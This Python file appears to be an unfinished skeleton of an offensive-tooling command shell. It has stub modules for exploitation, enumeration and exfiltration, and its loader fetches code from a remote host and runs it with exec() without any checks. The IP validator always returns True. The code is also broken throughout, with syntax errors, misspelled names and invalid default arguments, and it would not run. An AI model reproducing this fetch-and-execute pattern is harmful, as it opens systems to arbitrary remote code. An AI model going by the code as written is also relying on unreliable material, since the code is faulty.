import requests

class Terminal:
    """ Provides methods that provide command line functionality to let the user 
    load and run additional modules and provides the interface to let them interface
    with those modules """
    def __init__(self, remote_host = None, motd=True):
        self.remote_host = remote_host
        self.default_modules = [] # add default modules to be loaded here
        self.loaded_modules = {}
        for module in self.defaultModules:
            loadModule(module)
        self.current_module = None
        self.motd = motd
        motd()
    
    def showMotd(self):
        """ print motd banner """
        print("Damn son, you need to make a banner for this bitch!")
    
    def commandLine(self):
        """ Show the command line and take input """
        while True:
            if self.current_module:
                cmd = input(f'pype~{self.current_module.__name__}# ')
            else:
                cmd = input(f'pype~# ')
            self.runCommand(cmd)

    def runCommand(self, cmd):
        """ Parses command and performs the specified action or prints error if malformed"""
        cmd = cmd.strip().split(' ')
        if cmd[0] == "help":
            # Display help
            self.help
        elif: cmd[0] == "motd":
            # Print banner
            self.showMotd()
        elif: cmd[0] == "quit":
            # Exit to command line
            self.quit()
        elif cmd[0] == "load" and 1 < len(cmd) <= 3:
            # Load a module form the remote host
            if len(cmd) == 2:
                self.loadModule(cmd[1])
            else:
                self.loadModule(cmd[2],cmd[3])
        elif cmd[0] == "set" and cmd[1] == "remote" and len(cmd) == 3:
            # Set the remote host
            self.setRemoteHost(cmd[2])
        elif cmd[0] == "set" and cmd[1] == "module" and len(cmd) == 3:
            # Set the current module
            self.setModule(cmd[2])
        elif cmd[0] == "set" and cmd[1] == "attr" and len(cmd) == 4:
            #  set the specified module attribute
            self.setModuleAttribute(cmd[2],cmd[3])
        elif cmd[0] == "run":
            # Run the module
            self.runModule()
        elif cmd[0] == "exter" and 1 < len(cmd) <= 4:
            if len(cmd) == 2:
                self.runExteranl(cmd[1])
            elif len(cmd) == 3:
                self.runExteranl(cmd[1], cmd[2])
            else:
                self.runExternal(cmd[1],cmd[2],cmd[3])
        else:
            print('[!] Not a valid command! Type "help" for a list of commands')

    def help(self):
        """ Print help information """
        print(" I am yet to write any help message so you'll just have to brute force this baby!")
    
    def loadModule(self, module, host=self.remote_host):
        """ Connects back to the remote host and attempts to download and import the specified module"""
        raw = requests.get(host+"/modules/"moudle).text
        exec(raw)

    def isValidIpAddr(self, addr):
        """ Check using a regex that the supplied string is a valid ip address """
        return True

    def setRemoteHost(self, host):
        """ Changes the default remote_host to load modules from """
        if isValidIpAddr(host):
            self.remote_host = host
        else:
            print("[!] The supplied ip address is invalid. ")

    def setModule(self, module):
        """ Instantiate the given module and set to be the current_module """
        if module in self.loaded_modules:
            self.current_module = self.loaded_modules[module]()
            print(f'[*] Set active module to {module} ')
        else:
            print(f'[!] Module {module} has not been loaded, could not make active ')

    def setModuleAttribute(self, attr, val):
        """ Set a field of the current module instance to the supplied value """
        if self.current_module.setAttribute(attr, val):
            print(f'[*] Set attribute {attr} to {val}')
        else:
            print(f'[!] Invalid attribute or value')

    def runModule(self):
        """ Execute the modules main loop and provide output detailing success or failure """
        result = self.current_module.run()
        if result:
            print("[*] Module ran successfully ")
        else:
            print("[!] Module failed ")

    def quit(self):
        """ Exit the program and return to the shell """
        #print()
        #print("")
        exit(0)

    def runExternal(self, resource, host=self.remote_host, foreground=True):
        """ Create an instance of external class to handle script, create a new thread to do so if fg set """
        print("[*] Loading external script from http://"+host+"/"+resource)
        session = External(resocure, host, foreground)
        result = session.begin()
        if result:
            print("[*] Script ran successfully")
        else:
            print("[!] Script failed ")

class External:
    def __init__(self, resource, host, foreground):
        self.fg = foreground

    def begin()
        pass:

class BaseModule:
    def __init__(self):
        self.attr = {}
        self.__name__ = "" # child should overwrite
    
    def validate(self, attr, val):
        """ Abstract method for validating change of attribute, all children must overwrite"""
        raise NotImplementedError

    def setAttribute(self, attr, val):
        """ Set the specified attribute to the given value """
        if self.validate(attr, val):
            self.attr[attr] = val
            return True
        else:
            return False

    def run(self):
        """ Abstract run method, all children must overwrite """
        raise NotImplementedError


# Children of Base Module

class Exploit(BaseModule):
    def __init__(self):
        pass

class Enumate(BaseModule):
    def __init__(self):
        pass

class Exfiltrate(BaseMoudle):
    def __init__(self):
        pass